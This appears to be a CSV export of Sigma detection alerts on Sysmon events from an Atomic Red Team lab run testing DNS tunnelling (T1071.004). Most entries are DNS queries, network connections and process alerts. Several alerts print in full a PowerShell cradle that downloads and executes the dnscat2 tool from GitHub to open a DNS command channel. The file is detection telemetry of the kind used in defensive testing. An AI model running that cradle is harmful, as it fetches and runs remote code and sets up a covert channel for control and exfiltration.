"2025-12-22 14:01:36.432 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166576,"Query: 246.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicr.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:36.007","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.432 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166577,"Query: 247.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicre.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:36.047","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.433 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166578,"Query: 248.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicred.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:36.088","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.433 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166579,"Query: 249.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredt.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:36.133","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.433 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166580,"Query: 250.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredte.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:36.179","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:36.433 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166581,"Query: 251.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredtea.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:36.350","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:37.442 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166583,"Query: 252.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteam.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:36.397","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:38.458 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166585,"Query: 253.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteama.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:36.574","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:41.257 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166589,"Query: raw.githubusercontent.com ¦ Result: ::ffff:185.199.109.133;::ffff:185.199.108.133;::ffff:185.199.111.133;::ffff:185.199.110.133; ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100","QueryStatus: 0 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:39.262","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:47.570 +01:00","Possible Timestomping","low","DESKTOP-G2OBL3D","Sysmon",2,"Evas","","t1070.006 ¦ sysmon",166602,"Path: C:\Users\student\AppData\Roaming\Code\Network\2e2a2671-ef29-4326-aaf0-61520451c3f9.tmp ¦ Proc: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ User: DESKTOP-G2OBL3D\student ¦ CreateTime: 2025-10-16 15:05:33.847 ¦ PrevTime: 2025-12-22 13:01:47.557 ¦ PID: n/a ¦ PGUID: E9F06A57-2183-6949-D903-000000002100","ProcessId: 7152 ¦ RuleName: T1099 ¦ UtcTime: 2025-12-22 13:01:47.565","Sysmon_2_Low_PossibleTimestomping.yml","f03e34c4-6432-4a30-9ae2-76ae6329399a","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:41.448 +01:00","Net Conn","info","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",166590,"Initiated: true ¦ Proto: tcp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 58805 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 185.199.109.133 ¦ TgtPort: 443 ¦ TgtHost: cdn-185-199-109-133.github.com ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100","DestinationIsIpv6: false ¦ DestinationPortName: https ¦ RuleName: - ¦ SourceIsIpv6: false ¦ SourcePortName: - ¦ UtcTime: 2025-12-22 13:01:39.292","Sysmon_3_Info_NetConn.yml","a87defd7-1f87-4a34-8864-415ccb2ef21c","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:44.272 +01:00","Net Conn","info","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",166600,"Initiated: true ¦ Proto: udp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 59174 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 192.168.201.2 ¦ TgtPort: 53 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Windows\System32\nslookup.exe ¦ PID: 10420 ¦ PGUID: E9F06A57-4137-6949-6105-000000002100","DestinationIsIpv6: false ¦ DestinationPortName: domain ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-22 13:01:43.256","Sysmon_3_Info_NetConn.yml","a87defd7-1f87-4a34-8864-415ccb2ef21c","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:44.272 +01:00","Net Conn","info","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",166601,"Initiated: true ¦ Proto: udp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 59175 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 192.168.201.2 ¦ TgtPort: 53 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Windows\System32\nslookup.exe ¦ PID: 10420 ¦ PGUID: E9F06A57-4137-6949-6105-000000002100","DestinationIsIpv6: false ¦ DestinationPortName: domain ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-22 13:01:43.264","Sysmon_3_Info_NetConn.yml","a87defd7-1f87-4a34-8864-415ccb2ef21c","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:47.726 +01:00","Net Conn (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",166603,"Initiated: true ¦ Proto: udp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 56805 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 192.168.201.2 ¦ TgtPort: 53 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ PID: 7152 ¦ PGUID: E9F06A57-2183-6949-D903-000000002100","DestinationIsIpv6: false ¦ DestinationPortName: domain ¦ RuleName: Usermode ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-22 13:01:46.530","Sysmon_3_Med_NetConn_RuleAlert.yml","e13c5fe0-73f1-4c0f-aef5-1bab99b4237b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:47.726 +01:00","Net Conn (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",166604,"Initiated: true ¦ Proto: udp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 55803 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 192.168.201.2 ¦ TgtPort: 53 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ PID: 7152 ¦ PGUID: E9F06A57-2183-6949-D903-000000002100","DestinationIsIpv6: false ¦ DestinationPortName: domain ¦ RuleName: Usermode ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-22 13:01:46.531","Sysmon_3_Med_NetConn_RuleAlert.yml","e13c5fe0-73f1-4c0f-aef5-1bab99b4237b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:48.486 +01:00","Net Conn (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",166605,"Initiated: true ¦ Proto: tcp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 54689 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 13.107.246.44 ¦ TgtPort: 443 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ PID: 7152 ¦ PGUID: E9F06A57-2183-6949-D903-000000002100","DestinationIsIpv6: false ¦ DestinationPortName: https ¦ RuleName: Usermode ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-22 13:01:46.634","Sysmon_3_Med_NetConn_RuleAlert.yml","e13c5fe0-73f1-4c0f-aef5-1bab99b4237b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:40.512 +01:00","Dynamic CSharp Compile Artefact","low","DESKTOP-G2OBL3D","Sysmon",11,"Evas","T1027.004","sysmon",166587,"Path: C:\Users\student\AppData\Local\Temp\vqrajkvx\vqrajkvx.cmdline ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100","CreationUtcTime: 2025-12-22 13:01:40.482 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:40.482","file_event_win_csharp_compile_artefact.yml","b80443dd-bc46-d0c8-3c01-9ddbb0b5c673","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:42.050 +01:00","Dynamic CSharp Compile Artefact","low","DESKTOP-G2OBL3D","Sysmon",11,"Evas","T1027.004","sysmon",166594,"Path: C:\Users\student\AppData\Local\Temp\ndjuqk4q\ndjuqk4q.cmdline ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100","CreationUtcTime: 2025-12-22 13:01:42.001 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:42.001","file_event_win_csharp_compile_artefact.yml","b80443dd-bc46-d0c8-3c01-9ddbb0b5c673","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:40.599 +01:00","Dynamic .NET Compilation Via Csc.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1027.004","sysmon",166588,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\vqrajkvx\vqrajkvx.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 10380 ¦ PGUID: E9F06A57-4134-6949-5C05-000000002100 ¦ ParentPID: 1740 ¦ ParentPGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:40.559","proc_creation_win_csc_susp_dynamic_compilation.yml","29fb510e-d79c-6420-e60d-c05b708a6f9e","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:42.108 +01:00","Dynamic .NET Compilation Via Csc.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1027.004","sysmon",166595,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\ndjuqk4q\ndjuqk4q.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 3096 ¦ PGUID: E9F06A57-4136-6949-5E05-000000002100 ¦ ParentPID: 1740 ¦ ParentPGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:42.004","proc_creation_win_csc_susp_dynamic_compilation.yml","29fb510e-d79c-6420-e60d-c05b708a6f9e","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:42.371 +01:00","Suspicious Execution of Hostname","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1082","sysmon",166598,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 1804 ¦ PGUID: E9F06A57-4136-6949-6005-000000002100 ¦ ParentPID: 1740 ¦ ParentPGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:42.366","proc_creation_win_hostname_execution.yml","cd4f18d8-b261-1a76-2600-f039cd6f0310","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:37.351 +01:00","PowerShell Download and Execution Cradles","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",166582,"Cmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:36.889","proc_creation_win_powershell_download_iex.yml","745811d2-f9b3-6c05-f1f8-b245b4d26b9f","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:37.351 +01:00","PowerShell Download Pattern","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",166582,"Cmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:36.889","proc_creation_win_powershell_download_patterns.yml","9c070b47-5e34-6e96-ccce-205111752ae3","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:37.351 +01:00","Suspicious PowerShell Invocations - Specific - ProcessCreation","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","","sysmon",166582,"Cmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:36.889","proc_creation_win_powershell_invocation_specific.yml","e554e422-7cda-2292-0e64-7595a12743dd","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:37.351 +01:00","Malicious PowerShell Commandlets - ProcessCreation","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec ¦ Disc","T1482 ¦ T1087 ¦ T1087.001 ¦ T1087.002 ¦ T1069.001 ¦ T1069.002 ¦ T1069 ¦ T1059.001","sysmon",166582,"Cmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:36.889","proc_creation_win_powershell_malicious_cmdlets.yml","2f99fa24-ac46-0814-cbe5-85100e648050","C:\Tools\Logs\art_1071_004.evtx"
